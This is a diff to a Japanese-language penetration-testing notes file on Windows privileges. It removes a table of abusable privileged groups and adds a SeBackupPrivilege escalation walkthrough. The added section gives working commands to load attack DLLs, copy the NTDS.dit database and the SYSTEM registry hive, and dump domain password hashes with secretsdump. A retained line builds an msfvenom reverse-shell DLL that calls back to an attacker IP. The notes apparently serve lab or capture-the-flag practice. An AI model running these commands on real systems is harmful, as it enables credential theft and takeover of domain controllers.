@@ -1,21 +1,4 @@
-
 # Windows における権利と特権
-
-これらは、Windows ワークステーション、サーバー、またはドメイン コントローラー (DC) 上のドメイン管理者、ローカル管理者、または SYSTEM 権限を取得するために悪用できる
-
-| **グループ**                    | **説明**                                                                                                                                                                          |
-| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Default Administrators      | Domain Admins と Enterprise Admins は `super` グループ                                                                                                                                |
-| Server Operators            | メンバーはサービスを変更したり、SMB 共有にアクセスしたり、ファイルをバックアップしたりできる                                                                                                                                |
-| Backup Operators            | メンバーはローカルで DC にログオンすることが許可されており、ドメイン管理者とみなされる。 SAM/NTDS データベースのシャドウ コピーを作成し、リモートでレジストリを読み取り、SMB 経由で DC 上のファイル システムにアクセスできる。このグループは、DC 以外のローカルの Backup Operators グループに追加される場合がある |
-| Print Operators             | メンバーは DC にローカルでログオンし、Windows を「だまして」悪意のあるドライバーを読み込ませることができます                                                                                                                    |
-| Hyper-V Administrators      | 仮想 DC がある場合、Hyper-V 管理者のメンバーなどの仮想化管理者はドメイン管理者とみなされる                                                                                                                             |
-| Account Operators           | メンバーは、ドメイン内の保護されていないアカウントとグループを変更できます                                                                                                                                           |
-| Remote Desktop Users        | デフォルトではメンバーには有用なアクセス許可は与えられないが、多くの場合、`リモート デスクトップ サービスを介したログインを許可する`などの追加の権限が付与され、RDP プロトコルを使用して横方向に移動できる                                                                       |
-| Remote Management Users     | メンバーは、PSRemoting を使用して DC にログオンできる (このグループは、DC 以外のローカル リモート管理グループに追加される場合がある)。                                                                                                  |
-| Group Policy Creator Owners | メンバーは新しい GPO を作成できるが、GPO をドメインや OU などのコンテナーにリンクするには追加のアクセス許可を委任する必要がある                                                                                                          |
-| Schema Admins               | メンバーは、侵害されたアカウントをデフォルトのオブジェクト ACL に追加することで、Active Directory スキーマ構造を変更し、作成予定のグループ/GPO をバックドアにすることができる                                                                            |
-| DNS Admins                  | メンバーは DC に DLL をロードできるが、DNS サーバーを再起動するために必要な権限がない。悪意のある DLL をロードし、永続化メカニズムとして再起動を待機する可能性がある。 DLL をロードすると、多くの場合、サービスがクラッシュする。このグループを悪用するより確実な方法は、WPAD レコードを作成すること                |
 
 # ユーザー権利の割り当て
 
@@ -304,6 +287,49 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attack ip> LPORT=1337 -f dll -o
 ```
 
 ターゲットマシンの `C:\Windows\System32\wbem\tzres.dll` にコピーしてリスナーを起動、 `systeminfo` を実行することでシェルを取得できる
+
+
+
+# SeBackupPrivilege
+
+SeBackupPrivilege は、オブジェクトのセキュリティ設定に関係なく、ユーザーまたはプロセスにファイルとディレクトリを読み取る権限を持つ。この権限は、通常ユーザーがアクセスできないファイルをバックアップまたはコピーする機能を必要とする特定のバックアッププログラムまたはプロセスで使用できる。
+
+[SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege/tree/master) ここから悪意のある２つのdll `SeBackupPrivilegeUtils.dll`, `SeBackupPrivilegeCmdLets.dll`をダウンロードし、アップロードする
+
+## 権限の悪用
+
+dllを読み込ませる
+
+```
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+```
+
+権限を有効にする
+
+```
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+```
+
+### 機密ファイルのコピーと読み取り
+
+```
+Copy-FileSeBackupPrivilege C:\Users\Administrator\proof.txt C:\Users\Public\proof.txt -Overwrite
+```
+
+### パスワードハッシュを取得する
+
+```
+Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite
+reg save HKLM\SYSTEM c:\tmp\system
+```
+
+### パスワードハッシュをdump
+
+```
+impacket-secretsdump -ntds ntds.dit -system system LOCAL
+```
 
 
 
